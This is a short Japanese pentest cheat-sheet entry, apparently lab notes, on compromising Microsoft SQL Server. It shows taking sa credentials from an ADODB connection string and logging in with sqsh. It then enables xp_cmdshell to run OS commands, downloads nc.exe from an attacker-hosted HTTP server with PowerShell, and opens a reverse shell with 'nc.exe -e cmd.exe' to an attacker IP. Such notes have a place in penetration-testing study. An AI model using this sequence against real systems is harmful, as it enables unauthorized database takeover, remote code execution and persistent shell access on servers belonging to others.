### SQLServer

+ DB接続ソースなどから認証情報を取得できる場合がある

  ```
  set cnn = server.createobject("ADODB.Connection")
  cnn.open "PROVIDER=SQLOLEDB;DATA SOURCE=RALPH;User ID=sa;PWD=poiuytrewq;DATABASE=bankdb"
  ```

  ※saが管理者ユーザであることが多い

+ SQLserverへのログイン

  ```bash
  sqsh -S 10.11.1.31 -U sa -P poiuytrewq
  ```

  ```bash
  # db一覧
  select name from sys.databases;
  # 実行
  go
  use master;
  go
  # テーブル一覧
  select name from sysobjects where xtype = 'U'
  go
  
  # xp_cmdshellの有効化
  EXEC sp_configure 'show advanced options', 1
  RECONFIGURE
  go
  Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
  (return status = 0)
  1> EXEC sp_configure 'xp_cmdshell', 1
  2> RECONFIGURE
  3> go
  Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
  (return status = 0)
  EXEC xp_cmdshell 'net user'
  ```

  https://qiita.com/yakumomo/items/e12d91beb7d7784ab1fa

  https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

+ nc.exeを配送してリバースシェルを取得

  ```bash
  python -m http.server 80 -d /usr/share/windows-resources/binaries/
  ```

  ```
  EXEC xp_cmdshell "powershell.exe wget http://192.168.119.156/nc.exe -OutFile nc.exe"
  go
  EXEC xp_cmdshell  "nc.exe -e cmd.exe 192.168.119.156 4444"
  go
  ```

  

